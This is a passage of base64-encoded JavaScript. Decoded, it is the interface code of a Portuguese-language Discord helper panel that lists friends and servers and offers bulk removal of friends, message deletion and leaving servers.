uZ3RoKSB7CiAgICAgICAgICAgIGNvbnRlbnQuaW5uZXJIVE1MID0gYAogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlYXJjaC1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9ImZyaWVuZHMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIGFtaWdvcy4uLiIgdmFsdWU9IiR7c2VhcmNoVGVybX0iPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZW1wdHkiPiR7c2VhcmNoVGVybSA/ICJOZW5odW0gYW1pZ28gZW5jb250cmFkbyIgOiAiTmVuaHVtIGFtaWdvIn08L2Rpdj4KICAgICAgICAgICAgYDsKICAgICAgICAgICAgaWYgKHNlYXJjaFRlcm0pIGNvbnRlbnQucXVlcnlTZWxlY3RvcigiI2ZyaWVuZHMtc2VhcmNoIikuYWRkRXZlbnRMaXN0ZW5lcigiaW5wdXQiLCBlID0+IHJlbmRlckZyaWVuZHMoZnJpZW5kcywgZS50YXJnZXQudmFsdWUpKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9ImZyaWVuZHMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIGFtaWdvcy4uLiIgdmFsdWU9IiR7c2VhcmNoVGVybX0iPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBzZWNvbmRhcnkiIGlkPSJyZWZyZXNoLWZyaWVuZHMiPkF0dWFsaXphcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biIgaWQ9InJlbW92ZS1zZWxlY3RlZC1mcmllbmRzIj5SZW1vdmVyIFNlbGVjaW9uYWRvczwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBkYW5nZXIiIGlkPSJyZW1vdmUtYWxsLWZyaWVuZHMiPlJlbW92ZXIgVG9kb3M8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICR7ZmlsdGVyZWRGcmllbmRzLm1hcChmID0+IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1mcmllbmQiIGRhdGEtaWQ9IiR7Zi5pZH0iIGRhdGEtbmFtZT0iJHtmLnVzZXIuZ2xvYmFsX25hbWUgfHwgZi51c2VyLnVzZXJuYW1lfSIgZGF0YS1hdmF0YXI9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJHtmLmlkfS8ke2YudXNlci5hdmF0YXJ9LnBuZyI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iZGZtLWNoZWNrYm94Ij4KICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSJkZm0tYXZhdGFyIiBzcmM9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJHtmLmlkfS8ke2YudXNlci5hdmF0YXJ9LnBuZyIgb25lcnJvcj0idGhpcy5zcmM9J2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2VtYmVkL2F2YXRhcnMvMC5wbmcnIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0taW5mbyI+PGRpdiBjbGFzcz0iZGZtLW5hbWUiPiR7Zi51c2VyLmdsb2JhbF9uYW1lIHx8IGYudXNlci51c2VybmFtZX08L2Rpdj48L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZnJpZW5kLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tZGVsZXRlLW1lc3NhZ2VzIj5BcGFnYXIgTXNnczwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tcmVtb3ZlIj5SZW1vdmVyPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgYCkuam9pbigiIil9CiAgICAgICAgYDsKCiAgICAgICAgY29uc3Qgc2VhcmNoSW5wdXQgPSBjb250ZW50LnF1ZXJ5U2VsZWN0b3IoIiNmcmllbmRzLXNlYXJjaCIpOwogICAgICAgIGxldCBzZWFyY2hUaW1lb3V0OwogICAgICAgIHNlYXJjaElucHV0LmFkZEV2ZW50TGlzdGVuZXIoImlucHV0IiwgZSA9PiB7IGNsZWFyVGltZW91dChzZWFyY2hUaW1lb3V0KTsgc2VhcmNoVGltZW91dCA9IHNldFRpbWVvdXQoKCkgPT4gcmVuZGVyRnJpZW5kcyhmcmllbmRzLCBlLnRhcmdldC52YWx1ZSksIDMwMCk7IH0pOwogICAgICAgIHNlYXJjaElucHV0LmFkZEV2ZW50TGlzdGVuZXIoImtleXByZXNzIiwgZSA9PiB7IGlmIChlLmtleSA9PT0gIkVudGVyIikgeyBjbGVhclRpbWVvdXQoc2VhcmNoVGltZW91dCk7IHJlbmRlckZyaWVuZHMoZnJpZW5kcywgZS50YXJnZXQudmFsdWUpOyB9IH0pOwoKICAgICAgICBjb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5kZm0tY2hlY2tib3giKS5mb3JFYWNoKGNiID0+IGNiLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGUgPT4gZS50YXJnZXQuY2xvc2VzdCgiLmRmbS1mcmllbmQiKS5jbGFzc0xpc3QudG9nZ2xlKCJzZWxlY3RlZCIsIGUudGFyZ2V0LmNoZWNrZWQpKSk7CiAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCIuZGZtLWRlbGV0ZS1tZXNzYWdlcyIpLmZvckVhY2goYnRuID0+IGJ0bi5vbmNsaWNrID0gZSA9PiB7IGNvbnN0IGVsID0gZS50YXJnZXQuY2xvc2VzdCgiLmRmbS1mcmllbmQiKTsgZGVsZXRlQWxsTWVzc2FnZXMoZWwuZGF0YXNldC5pZCwgZWwuZGF0YXNldC5uYW1lKTsgfSk7CiAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCIuZGZtLXJlbW92ZSIpLmZvckVhY2goYnRuID0+IGJ0bi5vbmNsaWNrID0gYXN5bmMgZSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGVsID0gZS50YXJnZXQuY2xvc2VzdCgiLmRmbS1mcmllbmQiKTsKICAgICAgICAgICAgZS50YXJnZXQuZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBlLnRhcmdldC50ZXh0Q29udGVudCA9ICJSZW1vdmVuZG8uLi4iOwogICAgICAgICAgICBhd2FpdCByZW1vdmVGcmllbmQoZWwuZGF0YXNldC5pZCwgZWwuZGF0YXNldC5uYW1lLCBlbC5kYXRhc2V0LmF2YXRhcik7CiAgICAgICAgICAgIGVsLnJlbW92ZSgpOwogICAgICAgIH0pOwoKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicmVmcmVzaC1mcmllbmRzIikub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInJlZnJlc2gtZnJpZW5kcyIpOwogICAgICAgICAgICBidG4uZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBidG4udGV4dENvbnRlbnQgPSAiQXR1YWxpemFuZG8uLi4iOwogICAgICAgICAgICBjb25zdCBmcmllbmRzRGF0YSA9IGF3YWl0IGZldGNoRnJpZW5kcygpOwogICAgICAgICAgICByZW5kZXJGcmllbmRzKGZyaWVuZHNEYXRhLmZpbHRlcihmID0+IGYudHlwZSA9PT0gMSksIHNlYXJjaElucHV0LnZhbHVlKTsKICAgICAgICAgICAgYnRuLmRpc2FibGVkID0gZmFsc2U7CiAgICAgICAgICAgIGJ0bi50ZXh0Q29udGVudCA9ICJBdHVhbGl6YXIiOwogICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCJMaXN0YSBhdHVhbGl6YWRhISIsICJzdWNjZXNzIik7CiAgICAgICAgfTsKCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInJlbW92ZS1zZWxlY3RlZC1mcmllbmRzIikub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3Qgc2VsZWN0ZWQgPSBBcnJheS5mcm9tKGNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgiLmRmbS1mcmllbmQuc2VsZWN0ZWQiKSk7CiAgICAgICAgICAgIGlmICghc2VsZWN0ZWQubGVuZ3RoKSB7IHNob3dOb3RpZmljYXRpb24oIlNlbGVjaW9uZSBwZWxvIG1lbm9zIHVtIGFtaWdvISIsICJ3YXJuaW5nIik7IHJldHVybjsgfQoKICAgICAgICAgICAgc2hvd0NvbmZpcm1Nb2RhbChgUmVtb3ZlciAke3NlbGVjdGVkLmxlbmd0aH0gYW1pZ28ocyk/YCwgYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc3QgeyBtb2RhbDogcHJvZ3Jlc3NNb2RhbCwgc3RhdGU6IGNhbmNlbFN0YXRlIH0gPSBjcmVhdGVQcm9ncmVzc01vZGFsKCJSZW1vdmVuZG8gQW1pZ29zIiwgc2VsZWN0ZWQubGVuZ3RoKTsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CiAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNwcm9ncmVzcy10ZXh0Iik7CiAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcigiI3Byb2dyZXNzLWJhciIpOwogICAgICAgICAgICAgICAgbGV0IHJlbW92ZWRDb3VudCA9IDA7CgogICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzZWxlY3RlZC5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGVsID0gc2VsZWN0ZWRbaV07CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgcmVtb3ZlRnJpZW5kKGVsLmRhdGFzZXQuaWQsIGVsLmRhdGFzZXQubmFtZSwgZWwuZGF0YXNldC5hdmF0YXIpOwogICAgICAgICAgICAgICAgICAgIGVsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHJlbW92ZWRDb3VudCsrOwogICAgICAgICAgICAgICAgICAgIHVwZGF0ZVByb2dyZXNzKHByb2dyZXNzVGV4dCwgcHJvZ3Jlc3NCYXIsIGkgKyAxLCBzZWxlY3RlZC5sZW5ndGgsICJSZW1vdmVuZG8iKTsKICAgICAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgcmVxdWVzdERlbGF5KSk7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oY2FuY2VsU3RhdGUuY2FuY2VsbGVkID8gYENhbmNlbGFkbyEgJHtyZW1vdmVkQ291bnR9IGFtaWdvcyByZW1vdmlkb3MuYCA6IGAke3NlbGVjdGVkLmxlbmd0aH0gYW1pZ29zIHJlbW92aWRvcyFgLCBjYW5jZWxTdGF0ZS5jYW5jZWxsZWQgPyAid2FybmluZyIgOiAic3VjY2VzcyIpOwogICAgICAgICAgICB9KTsKICAgICAgICB9OwoKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicmVtb3ZlLWFsbC1mcmllbmRzIikub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgYWxsRnJpZW5kcyA9IEFycmF5LmZyb20oY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCIuZGZtLWZyaWVuZCIpKTsKICAgICAgICAgICAgaWYgKCFhbGxGcmllbmRzLmxlbmd0aCkgeyBzaG93Tm90aWZpY2F0aW9uKCJOZW5odW0gYW1pZ28gcGFyYSByZW1vdmVyISIsICJ3YXJuaW5nIik7IHJldHVybjsgfQoKICAgICAgICAgICAgc2hvd0NvbmZpcm1Nb2RhbChgQVRFTsOHw4NPISBSZW1vdmVyIFRPRE9TIG9zICR7YWxsRnJpZW5kcy5sZW5ndGh9IGFtaWdvcz88YnI+PGJyPkVzdGEgYcOnw6NvIG7Do28gcG9kZSBzZXIgZGVzZmVpdGEhYCwgYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc3QgeyBtb2RhbDogcHJvZ3Jlc3NNb2RhbCwgc3RhdGU6IGNhbmNlbFN0YXRlIH0gPSBjcmVhdGVQcm9ncmVzc01vZGFsKCJSZW1vdmVuZG8gQW1pZ29zIiwgYWxsRnJpZW5kcy5sZW5ndGgpOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwcm9ncmVzc01vZGFsKTsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzVGV4dCA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcigiI3Byb2dyZXNzLXRleHQiKTsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCIjcHJvZ3Jlc3MtYmFyIik7CiAgICAgICAgICAgICAgICBsZXQgcmVtb3ZlZENvdW50ID0gMDsKCiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFsbEZyaWVuZHMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSBicmVhazsKICAgICAgICAgICAgICAgICAgICBjb25zdCBlbCA9IGFsbEZyaWVuZHNbaV07CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgcmVtb3ZlRnJpZW5kKGVsLmRhdGFzZXQuaWQsIGVsLmRhdGFzZXQubmFtZSwgZWwuZGF0YXNldC5hdmF0YXIpOwogICAgICAgICAgICAgICAgICAgIGVsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHJlbW92ZWRDb3VudCsrOwogICAgICAgICAgICAgICAgICAgIHVwZGF0ZVByb2dyZXNzKHByb2dyZXNzVGV4dCwgcHJvZ3Jlc3NCYXIsIGkgKyAxLCBhbGxGcmllbmRzLmxlbmd0aCwgIlJlbW92ZW5kbyIpOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYENhbmNlbGFkbyEgJHtyZW1vdmVkQ291bnR9IGFtaWdvcyByZW1vdmlkb3MuYCwgIndhcm5pbmciKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImRmbS1zZWFyY2giIGlkPSJmcmllbmRzLXNlYXJjaCIgcGxhY2Vob2xkZXI9IkJ1c2NhciBhbWlnb3MuLi4iPjwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZW1wdHkiPk5lbmh1bSBhbWlnbzwvZGl2PgogICAgICAgICAgICAgICAgICAgIGA7CiAgICAgICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbigiVG9kb3Mgb3MgYW1pZ29zIHJlbW92aWRvcyEiLCAic3VjY2VzcyIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICB9OwogICAgfTsKCiAgICBjb25zdCByZW5kZXJTZXJ2ZXJzID0gKHNlcnZlcnMsIHNlYXJjaFRlcm0gPSAiIikgPT4gewogICAgICAgIGNvbnN0IGNvbnRlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic2VydmVycy10YWIiKTsKICAgICAgICBjb25zdCBmaWx0ZXJlZFNlcnZlcnMgPSBzZXJ2ZXJzLmZpbHRlcihzID0+ICFzLm93bmVyKTsKICAgICAgICBjb25zdCBmaWx0ZXJlZEFuZFNlYXJjaGVkID0gZmlsdGVySXRlbXMoZmlsdGVyZWRTZXJ2ZXJzLCBzZWFyY2hUZXJtKTsKCiAgICAgICAgaWYgKCFmaWx0ZXJlZEFuZFNlYXJjaGVkLmxlbmd0aCkgewogICAgICAgICAgICBjb250ZW50LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImRmbS1zZWFyY2giIGlkPSJzZXJ2ZXJzLXNlYXJjaCIgcGxhY2Vob2xkZXI9IkJ1c2NhciBzZXJ2aWRvcmVzLi4uIiB2YWx1ZT0iJHtzZWFyY2hUZXJtfSI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+JHtzZWFyY2hUZXJtID8gIk5lbmh1bSBzZXJ2aWRvciBlbmNvbnRyYWRvIiA6ICJOZW5odW0gc2Vydmlkb3IifTwvZGl2PgogICAgICAgICAgICBgOwogICAgICAgICAgICBpZiAoc2VhcmNoVGVybSkgY29udGVudC5xdWVyeVNlbGVjdG9yKCIjc2VydmVycy1zZWFyY2giKS5hZGRFdmVudExpc3RlbmVyKCJpbnB1dCIsIGUgPT4gcmVuZGVyU2VydmVycyhzZXJ2ZXJzLCBlLnRhcmdldC52YWx1ZSkpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBjb250ZW50LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlYXJjaC1jb250YWluZXIiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJkZm0tc2VhcmNoIiBpZD0ic2VydmVycy1zZWFyY2giIHBsYWNlaG9sZGVyPSJCdXNjYXIgc2Vydmlkb3Jlcy4uLiIgdmFsdWU9IiR7c2VhcmNoVGVybX0iPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBzZWNvbmRhcnkiIGlkPSJyZWZyZXNoLXNlcnZlcnMiPkF0dWFsaXphcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biIgaWQ9ImxlYXZlLXNlbGVjdGVkLXNlcnZlcnMiPlJlbW92ZXIgU2VsZWNpb25hZG9zPC9idXR0b24+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuIGRhbmdlciIgaWQ9ImxlYXZlLWFsbC1zZXJ2ZXJzIj5SZW1vdmVyIGRlIFRvZG9zPC9idXR0b24+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAke2ZpbHRlcmVkQW5kU2VhcmNoZWQubWFwKHMgPT4gewogICAgICAgICAgICAgICAgY29uc3QgaWNvblVybCA9IHMuaWNvbiA/IGBodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9pY29ucy8ke3MuaWR9LyR7cy5pY29ufS5wbmdgIDogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2VtYmVkL2F2YXRhcnMvMC5wbmciOwogICAgICAgICAgICAgICAgcmV0dXJuIGAKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VydmVyIiBkYXRhLWlkPSIke3MuaWR9IiBkYXRhLW5hbWU9IiR7cy5uYW1lfSIgZGF0YS1pY29uPSIke2ljb25Vcmx9Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iZGZtLWNoZWNrYm94Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBjbGFzcz0iZGZtLXNlcnZlci1pY29uIiBzcmM9IiR7aWNvblVybH0iIG9uZXJyb3I9InRoaXMuc3JjPSdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9lbWJlZC9hdmF0YXJzLzAucG5nJyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1pbmZvIj48ZGl2IGNsYXNzPSJkZm0tbmFtZSI+JHtzLm5hbWV9PC9kaXY+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZXJ2ZXItYWN0aW9ucyI+PGJ1dHRvbiBjbGFzcz0iZGZtLWxlYXZlLXNlcnZlciI+UmVtb3ZlcjwvYnV0dG9uPjwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgYDsKICAgICAgICAgICAgfSkuam9pbigiIil9CiAgICAgICAgYDsKCiAgICAgICAgY29uc3Qgc2VhcmNoSW5wdXQgPSBjb250ZW50LnF1ZXJ5U2VsZWN0b3IoIiNzZXJ2ZXJzLXNlYXJjaCIpOwogICAgICAgIGxldCBzZWFyY2hUaW1lb3V0OwogICAgICAgIHNlYXJjaElucHV0LmFkZEV2ZW50TGlzdGVuZXIoImlucHV0IiwgZSA9PiB7IGNsZWFyVGltZW91dChzZWFyY2hUaW1lb3V0KTsgc2VhcmNoVGltZW91dCA9IHNldFRpbWVvdXQoKCkgPT4gcmVuZGVyU2VydmVycyhzZXJ2ZXJzLCBlLnRhcmdldC52YWx1ZSksIDMwMCk7IH0pOwogICAgICAgIHNlYXJjaElucHV0LmFkZEV2ZW50TGlzdGVuZXIoImtleXByZXNzIiwgZSA9PiB7IGlmIChlLmtleSA9PT0gIkVudGVyIikgeyBjbGVhclRpbWVvdXQoc2VhcmNoVGltZW91dCk7IHJlbmRlclNlcnZlcnMoc2VydmVycywgZS50YXJnZXQudmFsdWUpOyB9IH0pOwoKICAgICAgICBjb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5kZm0tY2hlY2tib3giKS5mb3JFYWNoKGNiID0+IGNiLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGUgPT4gZS50YXJnZXQuY2xvc2VzdCgiLmRmbS1zZXJ2ZXIiKS5jbGFzc0xpc3QudG9nZ2xlKCJzZWxlY3RlZCIsIGUudGFyZ2V0LmNoZWNrZWQpKSk7CiAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCIuZGZtLWxlYXZlLXNlcnZlciIpLmZvckVhY2goYnRuID0+IGJ0bi5vbmNsaWNrID0gYXN5bmMgZSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGVsID0gZS50YXJnZXQuY2xvc2VzdCgiLmRmbS1zZXJ2ZXIiKTsKICAgICAgICAgICAgZS50YXJnZXQuZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBlLnRhcmdldC50ZXh0Q29udGVudCA9ICJTYWluZG8uLi4iOwogICAgICAgICAgICBhd2FpdCBsZWF2ZVNlcnZlcihlbC5kYXRhc2V0LmlkLCBlbC5kYXRhc2V0Lm5hbWUsIGVsLmRhdGFzZXQuaWNvbik7CiAgICAgICAgICAgIGVsLnJlbW92ZSgpOwogICAgICAgIH0pOwoKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicmVmcmVzaC1zZXJ2ZXJzIikub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInJlZnJlc2gtc2VydmVycyIpOwogICAgICAgICAgICBidG4uZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBidG4udGV4dENvbnRlbnQgPSAiQXR1YWxpemFuZG8uLi4iOwogICAgICAgICAgICBjb25zdCBzZXJ2ZXJzRGF0YSA9IGF3YWl0IGZldGNoU2VydmVycygpOwogICAgICAgICAgICByZW5kZXJTZXJ2ZXJzKHNlcnZlcnNEYXRhLCBzZWFyY2hJbnB1dC52YWx1ZSk7CiAgICAgICAgICAgIGJ0bi5kaXNhYmxlZCA9IGZhbHNlOwogICAgICAgICAgICBidG4udGV4dENvbnRlbnQgPSAiQXR1YWxpemFyIjsKICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbigiTGlzdGEgYXR1YWxpemFkYSEiLCAic3VjY2VzcyIpOwogICAgICAgIH07CgogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsZWF2ZS1zZWxlY3RlZC1zZXJ2ZXJzIikub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3Qgc2VsZWN0ZWQgPSBBcnJheS5mcm9tKGNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgiLmRmbS1zZXJ2ZXIuc2VsZWN0ZWQiKSk7CiAgICAgICAgICAgIGlmICghc2VsZWN0ZWQubGVuZ3RoKSB7IHNob3dOb3RpZmljYXRpb24oIlNlbGVjaW9uZSBwZWxvIG1lbm9zIHVtIHNlcnZpZG9yISIsICJ3YXJuaW5nIik7IHJldHVybjsgfQoKICAgICAgICAgICAgc2hvd0NvbmZpcm1Nb2RhbChgU2FpciBkZSAke3NlbGVjdGVkLmxlbmd0aH0gc2Vydmlkb3IoZXMpP2AsIGFzeW5jICgpID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgbW9kYWw6IHByb2dyZXNzTW9kYWwsIHN0YXRlOiBjYW5jZWxTdGF0ZSB9ID0gY3JlYXRlUHJvZ3Jlc3NNb2RhbCgiU2FpbmRvIGRlIFNlcnZpZG9yZXMiLCBzZWxlY3RlZC5sZW5ndGgpOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwcm9ncmVzc01vZGFsKTsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzVGV4dCA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcigiI3Byb2dyZXNzLXRleHQiKTsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCIjcHJvZ3Jlc3MtYmFyIik7CiAgICAgICAgICAgICAgICBsZXQgbGVmdENvdW50ID0gMDsKCiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHNlbGVjdGVkLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZWwgPSBzZWxlY3RlZFtpXTsKICAgICAgICAgICAgICAgICAgICBhd2FpdCBsZWF2ZVNlcnZlcihlbC5kYXRhc2V0LmlkLCBlbC5kYXRhc2V0Lm5hbWUsIGVsLmRhdGFzZXQuaWNvbik7CiAgICAgICAgICAgICAgICAgICAgZWwucmVtb3ZlKCk7CiAgICAgICAgICAgICAgICAgICAgbGVmdENvdW50Kys7CiAgICAgICAgICAgICAgICAgICAgdXBkYXRlUHJvZ3Jlc3MocHJvZ3Jlc3NUZXh0LCBwcm9ncmVzc0JhciwgaSArIDEsIHNlbGVjdGVkLmxlbmd0aCwgIlNhaW5kbyBkZSIpOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihjYW5jZWxTdGF0ZS5jYW5jZWxsZWQgPyBgQ2FuY2VsYWRvISBTYWl1IGRlICR7bGVmdENvdW50fSBzZXJ2aWRvcmVzLmAgOiBgU2FpdSBkZSAke3NlbGV